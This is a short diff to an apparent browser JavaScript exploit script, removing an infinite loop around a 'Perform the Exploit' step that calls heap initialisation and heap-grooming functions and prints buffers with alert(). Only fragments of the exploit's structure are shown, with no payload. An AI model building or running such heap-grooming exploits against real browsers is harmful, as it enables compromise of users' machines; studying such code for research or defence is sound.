@@ -90,7 +90,7 @@ memExh();
 
 // Step 5: Perform the Exploit
 function performExploit() {
-    while (true) {
+    
         let controlledBuffers = initializeHeap(); // Initialize the heap
         let groomedHeap = groomHeap(); // Groom the heap
 
@@ -126,7 +126,7 @@ function performExploit() {
             alert("Memory buffer after grooming " + i + ": " + se_c[i]);
         }
     }
-}
+
 
 performExploit();
 </script>
